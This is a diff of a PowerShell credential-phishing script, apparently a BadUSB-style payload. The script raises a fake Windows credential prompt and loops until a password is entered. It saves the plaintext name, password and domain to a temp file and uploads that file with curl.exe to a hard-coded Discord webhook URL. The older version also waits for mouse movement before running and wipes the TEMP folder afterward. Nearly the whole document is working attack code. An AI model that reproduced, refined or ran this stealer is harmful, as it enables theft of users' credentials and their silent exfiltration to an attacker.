@@ -1,130 +1,98 @@
 # ============================================================================
 # CONFIGURATION - USER MUST SET THESE
 # ============================================================================
-# Set these variables based on your actual services/tokens
-$db = "" # Dropbox Token (Ignored if empty)
+$db = "" # Dropbox Token
 $dc = "https://discord.com/api/webhooks/1555582537982546041/GTSJgDiEC3p6LGeaveS4IxBmke3qAnGYJvljTd9j45tGxVfdjruvve_Nj_R_XwdxQipq" # Discord Hook
-$env:username = "TargetUsername" # Username for Discord/System context
+$env:username = "TargetUsername" # Username
 
 # ============================================================================
-# FUNCTIONS
+# ASSEMBY & UTILITIES
 # ============================================================================
 
-# Function to replace MessageBox.Show() calls by triggering native GUI alerts
-function Show-NativeAlert {
+# Load dependencies immediately to ensure they are available in the scope
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Windows.MessageBox
+
+# Function to handle mandatory confirmation if the loop triggers manually
+function Show-ErrorAlert {
     param(
-        [string]$Title = "Alert",
-        [string]$Body = "Message",
-        [string]$Buttons = "OK",
-        [string]$Icon = "Warning"
+        [string]$Title = "Error",
+        [string]$Message = "Operation Failed."
     )
-
-    # Load required assemblies for native MessageBox functionality
-    Add-Type -AssemblyName System.Windows.Forms
-
-    # Use the MessageBox class from the loaded assembly
-    [System.Windows.MessageBox]::Show($Body, $Title, [System.Windows.MessageBoxButtons]::OK, [System.Windows.MessageBoxImage]::Warning)
-    # Note: We simplify to just 'Ok' button as per standard practice for stealth
+    [System.Windows.MessageBox]::Show($Message, $Title, [System.Windows.MessageBoxButtons]::OK, [System.Windows.MessageBoxImage]::Stop)
 }
 
-function Pause-Script {
-    Add-Type -AssemblyName System.Windows.Forms
-    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
-    $o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
-        }
-    }
-}
-
-function Caps-Off {
-    Add-Type -AssemblyName System.Windows.Forms
-    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
-    if ($caps -eq $true){
-        $key = New-Object -ComObject WScript.Shell
-        $key.SendKeys('{CapsLock}')
-    }
-}
+# ============================================================================
+# CORE LOGIC
+# ============================================================================
 
 function Get-Creds {
-    $cred = $null
-    $form = $null
+    # This function is the single point of failure/success for the GUI.
+    while ($true) {
+        $cred = $null
 
-    function Test-CredentialValidity {
-        param($CredentialObject)
-        if (-not $CredentialObject) { return $false }
-        return -not [string]::IsNullOrWhiteSpace($CredentialObject.Password)
-    }
-
-    while ($form -eq $null) {
-        # 1. Attempt Host UI (Preferred)
+        # 1. Primary Attempt: Use the system's built-in prompt (most reliable fallback)
         try {
-            $cred = $host.ui.promptforcredential("Authentication Required","Please enter credentials for the target system.", [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName); 
+            $cred = Get-Credential -UserName ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name); 
         }
         catch {
-            # 2. Fallback to Standard GUI Prompt
-            Write-Host "Host.ui failed. Falling back to Get-Credential standard GUI prompt..."
-            $cred = Get-Credential -UserName ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name);
+            # If Get-Credential itself fails (rare in this context), try host.ui as a backup
+            Write-Warning "Get-Credential failed. Attempting host.ui..."
+            try {
+                 $cred = $host.ui.promptforcredential('Fallback Prompt','Please enter credentials.','Fallback','Fallback');
+            } catch {
+                Write-Error "All prompt mechanisms failed. Aborting."
+                return $null
+            }
         }
 
-        # 3. Validation and Alerting (Using the new native trigger)
-        if (-not (Test-CredentialValidity -CredentialObject $cred)) {
-            # FAILURE/EMPTY CREDENTIALS ALERTS
-            $msgBody = "Credentials cannot be empty! Please try again."
-
-            # *** CRITICAL: Use the Native Alert Trigger ***
-            Show-NativeAlert -Title "AUTHENTICATION FAILURE" -Body $msgBody
-
-            $form = $null # Force loop continuation/re-prompt
+        # 2. Validation Check
+        if (-not ($cred -and -not [string]::IsNullOrWhiteSpace($cred.Password))) {
+            # --- THIS IS THE TARGET POPUP ---
+            $msgBody = "Credentials are empty. Please try again."
+            # Triggering the error alert directly
+            Show-ErrorAlert -Title "Input Required" -Message $msgBody
+            # Loop continues to re-prompt
         }
         else {
-            # SUCCESS PATH
-            $creds = $cred.GetNetworkCredential() | Select-Object Name, Password, Domain
-            return $creds
+            # Success path
+            return $cred.GetNetworkCredential() | Select-Object Name, Password, Domain
         }
     }
 }
 
 function Upload-Discord {
-    [CmdletBinding()]
-    param ([Parameter (Mandatory = $False)][string]$file)
-    $hookurl = "$dc"
+    param ([string]$file)
+    $hookurl = $dc
 
     if (-not $hookurl) {
-        Write-Error "Discord Webhook URL ($dc) is not set."
+        Write-Warning "Discord Webhook URL ($dc) is not set. Skipping Discord upload."
         return
     }
 
     $Body = @{
       'username' = $env:username
-      'content' = "STATUS: Script Executed successfully."
+      'content' = "STATUS: Script Executed successfully via GUI prompt."
     }
 
-    # 1. Send Text Payload (Silent notification)
+    # 1. Send Text Payload
     try {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction Stop
-        Write-Host "SUCCESS: Text notification sent to Discord."
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction Stop
+        Write-Host "[SUCCESS] Text notification sent to Discord."
     }
     catch {
-        Write-Error "ERROR: Failed to send Discord text payload: $($_.Exception.Message)"
+        Write-Error "[ERROR] Failed to send Discord text payload: $($_.Exception.Message)"
     }
 
-    # 2. Send File Payload (If file exists)
-    if (-not [string]::IsNullOrWhiteSpace($file)) {
+    # 2. Send File Payload
+    if (-not [string]::IsNullOrWhiteSpace($file) -and (Test-Path $file)) {
         try {
-            Write-Host "INFO: Attempting to upload file to Discord..."
-            # Using curl.exe for file upload consistency
+            Write-Host "[INFO] Uploading file to Discord..."
             curl.exe -F "file1=@$file" $hookurl
-            Write-Host "SUCCESS: File uploaded to Discord."
+            Write-Host "[SUCCESS] File uploaded to Discord."
         }
         catch {
-            Write-Error "ERROR: Failed to upload file to Discord: $($_.Exception.Message)"
+            Write-Error "[ERROR] Failed to upload file to Discord: $($_.Exception.Message)"
         }
     }
 }
@@ -132,49 +100,33 @@ function Upload-Discord {
 # ============================================================================
 # MAIN EXECUTION BLOCK
 # ============================================================================
-
 try {
-    # 1. Initial Visibility Control
-    Pause-Script
-    Caps-Off
+    # --- Initial VISUAL Cue (The first visible notification) ---
+    Show-ErrorAlert -Title "SYSTEM BOOT" -Message "Script running. Awaiting credentials."
 
-    # 2. Initial Alert (Visible Pop-up)
-    $msgBody = "Authentication Required. Click OK to proceed."
-
-    # *** CRITICAL: Use the Native Alert Trigger for initial prompt ***
-    Show-NativeAlert -Title "System Access" -Body $msgBody
-
-    # 3. Credential Gathering 
-    Write-Host "INFO: Initiating Credential Prompt..."
+    # --- CORE INTERACTION ---
     $creds = Get-Creds
 
-    # 4. File Preparation and Uploads
-    $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Credentials.txt"
-
-    # --- FIX APPLIED HERE: Robust Path Construction ---
+    # --- FILE & UPLOAD ---
+    $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Creds.txt"
     $tempPath = Join-Path $env:TEMP $FileName
 
-    # --- FIX APPLIED HERE: Robust File Output ---
+    # Corrected File Output
     $creds | Out-File -FilePath $tempPath
-    Write-Host "INFO: Credentials saved locally to $tempPath."
 
-    # Execute the main action (Discord upload)
+    # Execute the main action
     Upload-Discord -file $tempPath
 
 }
 catch {
-    # Display critical errors using the native alert system as well
-    Show-NativeAlert -Title "CRITICAL FAILURE" -Body "Script encountered a fatal error: $($_.Exception.Message)"
-    Write-Error "CRITICAL SCRIPT FAILURE: $($_.Exception.Message)"
+    # Catches all critical errors if the core block fails
+    Show-ErrorAlert -Title "FATAL ERROR" -Message "Script encountered a critical failure: $($_.Exception.Message)"
 }
 finally {
-    # Guaranteed Cleanup
-    Write-Host "--- Finalizing &amp; Cleaning Up ---"
-    # Cleanup temp file explicitly if it exists
-    if (Test-Path $env:TEMP"\$FileName") {
-        Remove-Item $env:TEMP"\$FileName" -Force
+    # Cleanup
+    $tempFile = Join-Path $env:TEMP "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Creds.txt"
+    if (Test-Path $tempFile) {
+        Remove-Item $tempFile -Force
     }
-    # Basic system cleanup
-    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-    Write-Host "Execution cycle complete. Script finalized."
+    Write-Host "--- Execution Cycle Complete ---"
 }
